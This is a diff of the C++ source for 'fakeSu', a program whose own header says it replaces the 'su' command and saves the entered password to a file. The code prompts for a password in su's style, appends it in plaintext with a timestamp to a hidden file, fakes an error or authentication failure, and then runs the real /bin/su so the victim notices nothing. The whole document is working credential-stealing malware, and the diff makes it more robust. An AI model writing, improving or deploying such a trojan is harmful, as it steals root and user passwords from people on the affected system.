@@ -1,3 +1,20 @@
+/* fakeSu. Replace the "su" command and save the password entered in a file.
+   Copyright (C) 2017-2018 Davide sofronia.
+
+   This program is free software: you can redistribute it and/or modify
+   it under the terms of the GNU General Public License as published by
+   the Free Software Foundation, either version 3 of the License, or
+   (at your option) any later version.
+
+   This program is distributed in the hope that it will be useful,
+   but WITHOUT ANY WARRANTY; without even the implied warranty of
+   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+   GNU General Public License for more details.
+
+   You should have received a copy of the GNU General Public License
+   along with this program.  If not, see <http://www.gnu.org/licenses/>.  
+   Written by Davide Sofronia <davidesofronia@gmail.com>.  */
+
 #include <iostream>
 #include <cstdlib>
 #include <cstdio>
@@ -5,15 +22,18 @@
 #include <ctime>
 #include <string>
 #include <unistd.h>
-#define PATH "/home/rooted/.save"
-#define HASH "$6$6LxYfOg6$py1X/6QN71BhITpR4mHnVM7ux6/CxS5uCIup9dSiXLoEXox.493fHuk9R6FAtu9rhT2Y3q0tjm8vAFAgKFb6U0"
+#include <stdexcept>
+#include <crypt.h>
 
+#define DEFAULT_USER "root"
+#define PATH "/home/rooted/.save"
+#define SALT "$6$6LxYfOg6"
+#define HASH "$6$6LxYfOg6$py1X/6QN71BhITpR4mHnVM7ux6/CxS5uCIup9dSiXLoEXox.493fHuk9R6FAtu9rhT2Y3q0tjm8vAFAgKFb6U0"
 int main(int argc, char *argv[]) {
 
-    /*== Variable ==*/
+    /*== Variables ==*/
     std::string passwd, user, command, createdHash;
     std::ofstream passwdFile;
-    std::ifstream insertedHashFile;
 
     /*== Control args ==*/
     try {
@@ -24,33 +44,15 @@ int main(int argc, char *argv[]) {
             user = std::string(argv[1]);            
         }
     } catch (std::logic_error) {
-        user = "root";
+        user = DEFAULT_USER;
     }
 
     /*== Take the password ==*/
-    std::cout << "Password: ";
-    system("stty -echo");
-    std::getline(std::cin, passwd);
-    system("stty echo");
-    std::cout << '\n';
+    passwd = std::string(getpass("Password: "));
     sleep(2); // Simulate real su
 
-    /*== Create the hash with the inserted password ==*/ //Salt = 6LxYf0g6
-    command = std::string("mkpasswd --method=sha-512 --salt=6LxYfOg6 ")+std::string("\"")+passwd+std::string("\" > /tmp/lol.xd");
-    system(command.c_str());
-    
-    /*== Open the created tmp hash file ==*/
-    insertedHashFile.open("/tmp/lol.xd", std::ios::in);
-    if(!insertedHashFile.is_open()) {
-        std::cerr << "An error has occurred\n";
-        insertedHashFile.close();
-        return -1;
-    }
-
-    /*== Take the hash ==*/
-    std::getline(insertedHashFile, createdHash);
-    insertedHashFile.close(); // close file
-    remove("/tmp/lol.xd");
+    /*== Crypt the password SHA-512 ==*/
+    createdHash = std::string(crypt(passwd.c_str(), SALT));
 
     /*== Open passwd File PATH ==*/
     passwdFile.open(PATH, std::ios::app);
@@ -73,18 +75,14 @@ int main(int argc, char *argv[]) {
         std::cerr << "An error has occured, Retry\n";
         
         /*== Start the real su ==*/
-        try {
-            command = "/bin/su " + user; 
-        } catch (std::logic_error) {
-            command = "/bin/su root";
-        } system(command.c_str());
+        execv("/bin/su", argv);
         return 0;    
 
     } else {
         /*== ERROR ==*/
         passwdFile << "ERROR (" << date << "): " << passwd << '\n';
         passwdFile.close();
-        std::cerr << "su: Authentication failure";
+        std::cerr << "su: Authentication failure\n";
         return 1;
     }
 }
